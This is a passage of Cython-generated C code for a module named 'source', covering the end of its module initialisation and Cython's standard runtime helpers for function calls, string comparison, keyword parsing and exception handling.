  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_9report_entity, 0, __pyx_n_s_report_entity, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__5)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 83, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_report_entity, __pyx_t_1) < 0) __PYX_ERR(0, 83, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_6source_12main, 0, __pyx_n_s_main_2, NULL, __pyx_n_s_source, __pyx_d, ((PyObject *)__pyx_codeobj__37)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 223, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_main_2, __pyx_t_1) < 0) __PYX_ERR(0, 223, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_name); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 229, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_4 = (__Pyx_PyUnicode_Equals(__pyx_t_1, __pyx_n_u_main, Py_EQ)); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 229, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (__pyx_t_4) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_main_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 230, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = __Pyx_PyObject_CallNoArg(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 230, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    
  }

  
  __pyx_t_2 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_2) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /*--- Wrapped vars code ---*/

  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  if (__pyx_m) {
    if (__pyx_d) {
      __Pyx_AddTraceback("init source", __pyx_clineno, __pyx_lineno, __pyx_filename);
    }
    Py_CLEAR(__pyx_m);
  } else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_ImportError, "init source");
  }
  __pyx_L0:;
  __Pyx_RefNannyFinishContext();
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  return (__pyx_m != NULL) ? 0 : -1;
  #elif PY_MAJOR_VERSION >= 3
  return __pyx_m;
  #else
  return;
  #endif
}

/* --- Runtime support code --- */
/* Refnanny */
#if CYTHON_REFNANNY
static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {
    PyObject *m = NULL, *p = NULL;
    void *r = NULL;
    m = PyImport_ImportModule(modname);
    if (!m) goto end;
    p = PyObject_GetAttrString(m, "RefNannyAPI");
    if (!p) goto end;
    r = PyLong_AsVoidPtr(p);
end:
    Py_XDECREF(p);
    Py_XDECREF(m);
    return (__Pyx_RefNannyAPIStruct *)r;
}
#endif

/* PyObjectGetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro))
        return tp->tp_getattro(obj, attr_name);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_getattr))
        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));
#endif
    return PyObject_GetAttr(obj, attr_name);
}
#endif

/* GetBuiltinName */
static PyObject *__Pyx_GetBuiltinName(PyObject *name) {
    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);
    if (unlikely(!result)) {
        PyErr_Format(PyExc_NameError,
#if PY_MAJOR_VERSION >= 3
            "name '%U' is not defined", name);
#else
            "name '%.200s' is not defined", PyString_AS_STRING(name));
#endif
    }
    return result;
}

/* PyFunctionFastCall */
#if CYTHON_FAST_PYCALL
static PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject *co, PyObject **args, Py_ssize_t na,
                                               PyObject *globals) {
    PyFrameObject *f;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject **fastlocals;
    Py_ssize_t i;
    PyObject *result;
    assert(globals != NULL);
    /* XXX Perhaps we should create a specialized
       PyFrame_New() that doesn't take locals, but does
       take builtins without sanity checking them.
       */
    assert(tstate != NULL);
    f = PyFrame_New(tstate, co, globals, NULL);
    if (f == NULL) {
        return NULL;
    }
    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);
    for (i = 0; i < na; i++) {
        Py_INCREF(*args);
        fastlocals[i] = *args++;
    }
    result = PyEval_EvalFrameEx(f,0);
    ++tstate->recursion_depth;
    Py_DECREF(f);
    --tstate->recursion_depth;
    return result;
}
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs) {
    PyCodeObject *co = (PyCodeObject *)PyFunction_GET_CODE(func);
    PyObject *globals = PyFunction_GET_GLOBALS(func);
    PyObject *argdefs = PyFunction_GET_DEFAULTS(func);
    PyObject *closure;
#if PY_MAJOR_VERSION >= 3
    PyObject *kwdefs;
#endif
    PyObject *kwtuple, **k;
    PyObject **d;
    Py_ssize_t nd;
    Py_ssize_t nk;
    PyObject *result;
    assert(kwargs == NULL || PyDict_Check(kwargs));
    nk = kwargs ? PyDict_Size(kwargs) : 0;
    if (Py_EnterRecursiveCall((char*)" while calling a Python object")) {
        return NULL;
    }
    if (
#if PY_MAJOR_VERSION >= 3
            co->co_kwonlyargcount == 0 &&
#endif
            likely(kwargs == NULL || nk == 0) &&
            co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)) {
        if (argdefs == NULL && co->co_argcount == nargs) {
            result = __Pyx_PyFunction_FastCallNoKw(co, args, nargs, globals);
            goto done;
        }
        else if (nargs == 0 && argdefs != NULL
                 && co->co_argcount == Py_SIZE(argdefs)) {
            /* function called with no arguments, but all parameters have
               a default value: use default values as arguments .*/
            args = &PyTuple_GET_ITEM(argdefs, 0);
            result =__Pyx_PyFunction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);
            goto done;
        }
    }
    if (kwargs != NULL) {
        Py_ssize_t pos, i;
        kwtuple = PyTuple_New(2 * nk);
        if (kwtuple == NULL) {
            result = NULL;
            goto done;
        }
        k = &PyTuple_GET_ITEM(kwtuple, 0);
        pos = i = 0;
        while (PyDict_Next(kwargs, &pos, &k[i], &k[i+1])) {
            Py_INCREF(k[i]);
            Py_INCREF(k[i+1]);
            i += 2;
        }
        nk = i / 2;
    }
    else {
        kwtuple = NULL;
        k = NULL;
    }
    closure = PyFunction_GET_CLOSURE(func);
#if PY_MAJOR_VERSION >= 3
    kwdefs = PyFunction_GET_KW_DEFAULTS(func);
#endif
    if (argdefs != NULL) {
        d = &PyTuple_GET_ITEM(argdefs, 0);
        nd = Py_SIZE(argdefs);
    }
    else {
        d = NULL;
        nd = 0;
    }
#if PY_MAJOR_VERSION >= 3
    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, kwdefs, closure);
#else
    result = PyEval_EvalCodeEx(co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, closure);
#endif
    Py_XDECREF(kwtuple);
done:
    Py_LeaveRecursiveCall();
    return result;
}
#endif
#endif

/* PyObjectCall */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    PyObject *result;
    ternaryfunc call = Py_TYPE(func)->tp_call;
    if (unlikely(!call))
        return PyObject_Call(func, arg, kw);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = (*call)(func, arg, kw);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectCallMethO */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg) {
    PyObject *self, *result;
    PyCFunction cfunc;
    cfunc = PyCFunction_GET_FUNCTION(func);
    self = PyCFunction_GET_SELF(func);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = cfunc(self, arg);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectCallNoArg */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, NULL, 0);
    }
#endif
#if defined(__Pyx_CyFunction_USED) && defined(NDEBUG)
    if (likely(PyCFunction_Check(func) || __Pyx_CyFunction_Check(func)))
#else
    if (likely(PyCFunction_Check(func)))
#endif
    {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_NOARGS)) {
            return __Pyx_PyObject_CallMethO(func, NULL);
        }
    }
    return __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL);
}
#endif

/* PyCFunctionFastCall */
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject * __Pyx_PyCFunction_FastCall(PyObject *func_obj, PyObject **args, Py_ssize_t nargs) {
    PyCFunctionObject *func = (PyCFunctionObject*)func_obj;
    PyCFunction meth = PyCFunction_GET_FUNCTION(func);
    PyObject *self = PyCFunction_GET_SELF(func);
    int flags = PyCFunction_GET_FLAGS(func);
    assert(PyCFunction_Check(func));
    assert(METH_FASTCALL == (flags & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)));
    assert(nargs >= 0);
    assert(nargs == 0 || args != NULL);
    /* _PyCFunction_FastCallDict() must not be called with an exception set,
       because it may clear it (directly or indirectly) and so the
       caller loses its exception */
    assert(!PyErr_Occurred());
    if ((PY_VERSION_HEX < 0x030700A0) || unlikely(flags & METH_KEYWORDS)) {
        return (*((__Pyx_PyCFunctionFastWithKeywords)(void*)meth)) (self, args, nargs, NULL);
    } else {
        return (*((__Pyx_PyCFunctionFast)(void*)meth)) (self, args, nargs);
    }
}
#endif

/* PyObjectCallOneArg */
#if CYTHON_COMPILING_IN_CPYTHON
static PyObject* __Pyx__PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_New(1);
    if (unlikely(!args)) return NULL;
    Py_INCREF(arg);
    PyTuple_SET_ITEM(args, 0, arg);
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, &arg, 1);
    }
#endif
    if (likely(PyCFunction_Check(func))) {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_O)) {
            return __Pyx_PyObject_CallMethO(func, arg);
#if CYTHON_FAST_PYCCALL
        } else if (__Pyx_PyFastCFunction_Check(func)) {
            return __Pyx_PyCFunction_FastCall(func, &arg, 1);
#endif
        }
    }
    return __Pyx__PyObject_CallOneArg(func, arg);
}
#else
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_Pack(1, arg);
    if (unlikely(!args)) return NULL;
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
#endif

/* BytesEquals */
static CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals) {
#if CYTHON_COMPILING_IN_PYPY
    return PyObject_RichCompareBool(s1, s2, equals);
#else
    if (s1 == s2) {
        return (equals == Py_EQ);
    } else if (PyBytes_CheckExact(s1) & PyBytes_CheckExact(s2)) {
        const char *ps1, *ps2;
        Py_ssize_t length = PyBytes_GET_SIZE(s1);
        if (length != PyBytes_GET_SIZE(s2))
            return (equals == Py_NE);
        ps1 = PyBytes_AS_STRING(s1);
        ps2 = PyBytes_AS_STRING(s2);
        if (ps1[0] != ps2[0]) {
            return (equals == Py_NE);
        } else if (length == 1) {
            return (equals == Py_EQ);
        } else {
            int result;
#if CYTHON_USE_UNICODE_INTERNALS && (PY_VERSION_HEX < 0x030B0000)
            Py_hash_t hash1, hash2;
            hash1 = ((PyBytesObject*)s1)->ob_shash;
            hash2 = ((PyBytesObject*)s2)->ob_shash;
            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {
                return (equals == Py_NE);
            }
#endif
            result = memcmp(ps1, ps2, (size_t)length);
            return (equals == Py_EQ) ? (result == 0) : (result != 0);
        }
    } else if ((s1 == Py_None) & PyBytes_CheckExact(s2)) {
        return (equals == Py_NE);
    } else if ((s2 == Py_None) & PyBytes_CheckExact(s1)) {
        return (equals == Py_NE);
    } else {
        int result;
        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);
        if (!py_result)
            return -1;
        result = __Pyx_PyObject_IsTrue(py_result);
        Py_DECREF(py_result);
        return result;
    }
#endif
}

/* UnicodeEquals */
static CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals) {
#if CYTHON_COMPILING_IN_PYPY
    return PyObject_RichCompareBool(s1, s2, equals);
#else
#if PY_MAJOR_VERSION < 3
    PyObject* owned_ref = NULL;
#endif
    int s1_is_unicode, s2_is_unicode;
    if (s1 == s2) {
        goto return_eq;
    }
    s1_is_unicode = PyUnicode_CheckExact(s1);
    s2_is_unicode = PyUnicode_CheckExact(s2);
#if PY_MAJOR_VERSION < 3
    if ((s1_is_unicode & (!s2_is_unicode)) && PyString_CheckExact(s2)) {
        owned_ref = PyUnicode_FromObject(s2);
        if (unlikely(!owned_ref))
            return -1;
        s2 = owned_ref;
        s2_is_unicode = 1;
    } else if ((s2_is_unicode & (!s1_is_unicode)) && PyString_CheckExact(s1)) {
        owned_ref = PyUnicode_FromObject(s1);
        if (unlikely(!owned_ref))
            return -1;
        s1 = owned_ref;
        s1_is_unicode = 1;
    } else if (((!s2_is_unicode) & (!s1_is_unicode))) {
        return __Pyx_PyBytes_Equals(s1, s2, equals);
    }
#endif
    if (s1_is_unicode & s2_is_unicode) {
        Py_ssize_t length;
        int kind;
        void *data1, *data2;
        if (unlikely(__Pyx_PyUnicode_READY(s1) < 0) || unlikely(__Pyx_PyUnicode_READY(s2) < 0))
            return -1;
        length = __Pyx_PyUnicode_GET_LENGTH(s1);
        if (length != __Pyx_PyUnicode_GET_LENGTH(s2)) {
            goto return_ne;
        }
#if CYTHON_USE_UNICODE_INTERNALS
        {
            Py_hash_t hash1, hash2;
        #if CYTHON_PEP393_ENABLED
            hash1 = ((PyASCIIObject*)s1)->hash;
            hash2 = ((PyASCIIObject*)s2)->hash;
        #else
            hash1 = ((PyUnicodeObject*)s1)->hash;
            hash2 = ((PyUnicodeObject*)s2)->hash;
        #endif
            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {
                goto return_ne;
            }
        }
#endif
        kind = __Pyx_PyUnicode_KIND(s1);
        if (kind != __Pyx_PyUnicode_KIND(s2)) {
            goto return_ne;
        }
        data1 = __Pyx_PyUnicode_DATA(s1);
        data2 = __Pyx_PyUnicode_DATA(s2);
        if (__Pyx_PyUnicode_READ(kind, data1, 0) != __Pyx_PyUnicode_READ(kind, data2, 0)) {
            goto return_ne;
        } else if (length == 1) {
            goto return_eq;
        } else {
            int result = memcmp(data1, data2, (size_t)(length * kind));
            #if PY_MAJOR_VERSION < 3
            Py_XDECREF(owned_ref);
            #endif
            return (equals == Py_EQ) ? (result == 0) : (result != 0);
        }
    } else if ((s1 == Py_None) & s2_is_unicode) {
        goto return_ne;
    } else if ((s2 == Py_None) & s1_is_unicode) {
        goto return_ne;
    } else {
        int result;
        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);
        #if PY_MAJOR_VERSION < 3
        Py_XDECREF(owned_ref);
        #endif
        if (!py_result)
            return -1;
        result = __Pyx_PyObject_IsTrue(py_result);
        Py_DECREF(py_result);
        return result;
    }
return_eq:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(owned_ref);
    #endif
    return (equals == Py_EQ);
return_ne:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(owned_ref);
    #endif
    return (equals == Py_NE);
#endif
}

/* PyDictVersioning */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {
    PyObject **dictptr = NULL;
    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;
    if (offset) {
#if CYTHON_COMPILING_IN_CPYTHON
        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);
#else
        dictptr = _PyObject_GetDictPtr(obj);
#endif
    }
    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;
}
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))
        return 0;
    return obj_dict_version == __Pyx_get_object_dict_version(obj);
}
#endif

/* GetModuleGlobalName */
#if CYTHON_USE_DICT_VERSIONS
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)
#else
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)
#endif
{
    PyObject *result;
#if !CYTHON_AVOID_BORROWED_REFS
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    } else if (unlikely(PyErr_Occurred())) {
        return NULL;
    }
#else
    result = PyDict_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
#endif
#else
    result = PyObject_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
    PyErr_Clear();
#endif
    return __Pyx_GetBuiltinName(name);
}

/* RaiseDoubleKeywords */
static void __Pyx_RaiseDoubleKeywordsError(
    const char* func_name,
    PyObject* kw_name)
{
    PyErr_Format(PyExc_TypeError,
        #if PY_MAJOR_VERSION >= 3
        "%s() got multiple values for keyword argument '%U'", func_name, kw_name);
        #else
        "%s() got multiple values for keyword argument '%s'", func_name,
        PyString_AsString(kw_name));
        #endif
}

/* ParseKeywords */
static int __Pyx_ParseOptionalKeywords(
    PyObject *kwds,
    PyObject **argnames[],
    PyObject *kwds2,
    PyObject *values[],
    Py_ssize_t num_pos_args,
    const char* function_name)
{
    PyObject *key = 0, *value = 0;
    Py_ssize_t pos = 0;
    PyObject*** name;
    PyObject*** first_kw_arg = argnames + num_pos_args;
    while (PyDict_Next(kwds, &pos, &key, &value)) {
        name = first_kw_arg;
        while (*name && (**name != key)) name++;
        if (*name) {
            values[name-argnames] = value;
            continue;
        }
        name = first_kw_arg;
        #if PY_MAJOR_VERSION < 3
        if (likely(PyString_Check(key))) {
            while (*name) {
                if ((CYTHON_COMPILING_IN_PYPY || PyString_GET_SIZE(**name) == PyString_GET_SIZE(key))
                        && _PyString_Eq(**name, key)) {
                    values[name-argnames] = value;
                    break;
                }
                name++;
            }
            if (*name) continue;
            else {
                PyObject*** argname = argnames;
                while (argname != first_kw_arg) {
                    if ((**argname == key) || (
                            (CYTHON_COMPILING_IN_PYPY || PyString_GET_SIZE(**argname) == PyString_GET_SIZE(key))
                             && _PyString_Eq(**argname, key))) {
                        goto arg_passed_twice;
                    }
                    argname++;
                }
            }
        } else
        #endif
        if (likely(PyUnicode_Check(key))) {
            while (*name) {
                int cmp = (**name == key) ? 0 :
                #if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION >= 3
                    (__Pyx_PyUnicode_GET_LENGTH(**name) != __Pyx_PyUnicode_GET_LENGTH(key)) ? 1 :
                #endif
                    PyUnicode_Compare(**name, key);
                if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;
                if (cmp == 0) {
                    values[name-argnames] = value;
                    break;
                }
                name++;
            }
            if (*name) continue;
            else {
                PyObject*** argname = argnames;
                while (argname != first_kw_arg) {
                    int cmp = (**argname == key) ? 0 :
                    #if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION >= 3
                        (__Pyx_PyUnicode_GET_LENGTH(**argname) != __Pyx_PyUnicode_GET_LENGTH(key)) ? 1 :
                    #endif
                        PyUnicode_Compare(**argname, key);
                    if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;
                    if (cmp == 0) goto arg_passed_twice;
                    argname++;
                }
            }
        } else
            goto invalid_keyword_type;
        if (kwds2) {
            if (unlikely(PyDict_SetItem(kwds2, key, value))) goto bad;
        } else {
            goto invalid_keyword;
        }
    }
    return 0;
arg_passed_twice:
    __Pyx_RaiseDoubleKeywordsError(function_name, key);
    goto bad;
invalid_keyword_type:
    PyErr_Format(PyExc_TypeError,
        "%.200s() keywords must be strings", function_name);
    goto bad;
invalid_keyword:
    PyErr_Format(PyExc_TypeError,
    #if PY_MAJOR_VERSION < 3
        "%.200s() got an unexpected keyword argument '%.200s'",
        function_name, PyString_AsString(key));
    #else
        "%s() got an unexpected keyword argument '%U'",
        function_name, key);
    #endif
bad:
    return -1;
}

/* RaiseArgTupleInvalid */
static void __Pyx_RaiseArgtupleInvalid(
    const char* func_name,
    int exact,
    Py_ssize_t num_min,
    Py_ssize_t num_max,
    Py_ssize_t num_found)
{
    Py_ssize_t num_expected;
    const char *more_or_less;
    if (num_found < num_min) {
        num_expected = num_min;
        more_or_less = "at least";
    } else {
        num_expected = num_max;
        more_or_less = "at most";
    }
    if (exact) {
        more_or_less = "exactly";
    }
    PyErr_Format(PyExc_TypeError,
                 "%.200s() takes %.8s %" CYTHON_FORMAT_SSIZE_T "d positional argument%.1s (%" CYTHON_FORMAT_SSIZE_T "d given)",
                 func_name, more_or_less, num_expected,
                 (num_expected == 1) ? "" : "s", num_found);
}

/* PyObjectCall2Args */
static CYTHON_UNUSED PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2) {
    PyObject *args, *result = NULL;
    #if CYTHON_FAST_PYCALL
    if (PyFunction_Check(function)) {
        PyObject *args[2] = {arg1, arg2};
        return __Pyx_PyFunction_FastCall(function, args, 2);
    }
    #endif
    #if CYTHON_FAST_PYCCALL
    if (__Pyx_PyFastCFunction_Check(function)) {
        PyObject *args[2] = {arg1, arg2};
        return __Pyx_PyCFunction_FastCall(function, args, 2);
    }
    #endif
    args = PyTuple_New(2);
    if (unlikely(!args)) goto done;
    Py_INCREF(arg1);
    PyTuple_SET_ITEM(args, 0, arg1);
    Py_INCREF(arg2);
    PyTuple_SET_ITEM(args, 1, arg2);
    Py_INCREF(function);
    result = __Pyx_PyObject_Call(function, args, NULL);
    Py_DECREF(args);
    Py_DECREF(function);
done:
    return result;
}

/* JoinPyUnicode */
static PyObject* __Pyx_PyUnicode_Join(PyObject* value_tuple, Py_ssize_t value_count, Py_ssize_t result_ulength,
                                      CYTHON_UNUSED Py_UCS4 max_char) {
#if CYTHON_USE_UNICODE_INTERNALS && CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    PyObject *result_uval;
    int result_ukind;
    Py_ssize_t i, char_pos;
    void *result_udata;
#if CYTHON_PEP393_ENABLED
    result_uval = PyUnicode_New(result_ulength, max_char);
    if (unlikely(!result_uval)) return NULL;
    result_ukind = (max_char <= 255) ? PyUnicode_1BYTE_KIND : (max_char <= 65535) ? PyUnicode_2BYTE_KIND : PyUnicode_4BYTE_KIND;
    result_udata = PyUnicode_DATA(result_uval);
#else
    result_uval = PyUnicode_FromUnicode(NULL, result_ulength);
    if (unlikely(!result_uval)) return NULL;
    result_ukind = sizeof(Py_UNICODE);
    result_udata = PyUnicode_AS_UNICODE(result_uval);
#endif
    char_pos = 0;
    for (i=0; i < value_count; i++) {
        int ukind;
        Py_ssize_t ulength;
        void *udata;
        PyObject *uval = PyTuple_GET_ITEM(value_tuple, i);
        if (unlikely(__Pyx_PyUnicode_READY(uval)))
            goto bad;
        ulength = __Pyx_PyUnicode_GET_LENGTH(uval);
        if (unlikely(!ulength))
            continue;
        if (unlikely(char_pos + ulength < 0))
            goto overflow;
        ukind = __Pyx_PyUnicode_KIND(uval);
        udata = __Pyx_PyUnicode_DATA(uval);
        if (!CYTHON_PEP393_ENABLED || ukind == result_ukind) {
            memcpy((char *)result_udata + char_pos * result_ukind, udata, (size_t) (ulength * result_ukind));
        } else {
            #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030300F0 || defined(_PyUnicode_FastCopyCharacters)
            _PyUnicode_FastCopyCharacters(result_uval, char_pos, uval, 0, ulength);
            #else
            Py_ssize_t j;
            for (j=0; j < ulength; j++) {
                Py_UCS4 uchar = __Pyx_PyUnicode_READ(ukind, udata, j);
                __Pyx_PyUnicode_WRITE(result_ukind, result_udata, char_pos+j, uchar);
            }
            #endif
        }
        char_pos += ulength;
    }
    return result_uval;
overflow:
    PyErr_SetString(PyExc_OverflowError, "join() result is too long for a Python string");
bad:
    Py_DECREF(result_uval);
    return NULL;
#else
    result_ulength++;
    value_count++;
    return PyUnicode_Join(__pyx_empty_unicode, value_tuple);
#endif
}

/* GetTopmostException */
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem *
__Pyx_PyErr_GetTopmostException(PyThreadState *tstate)
{
    _PyErr_StackItem *exc_info = tstate->exc_info;
    while ((exc_info->exc_type == NULL || exc_info->exc_type == Py_None) &&
           exc_info->previous_item != NULL)
    {
        exc_info = exc_info->previous_item;
    }
    return exc_info;
}
#endif

/* SaveResetException */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = __Pyx_PyErr_GetTopmostException(tstate);
    *type = exc_info->exc_type;
    *value = exc_info->exc_value;
    *tb = exc_info->exc_traceback;
    #else
    *type = tstate->exc_type;
    *value = tstate->exc_value;
    *tb = tstate->exc_traceback;
    #endif
    Py_XINCREF(*type);
    Py_XINCREF(*value);
    Py_XINCREF(*tb);
}
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = type;
    exc_info->exc_value = value;
    exc_info->exc_traceback = tb;
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = type;
    tstate->exc_value = value;
    tstate->exc_traceback = tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
#endif

/* PyErrExceptionMatches */
#if CYTHON_FAST_THREAD_STATE
static int __Pyx_PyErr_ExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        if (__Pyx_PyErr_GivenExceptionMatches(exc_type, PyTuple_GET_ITEM(tuple, i))) return 1;
    }
    return 0;
}
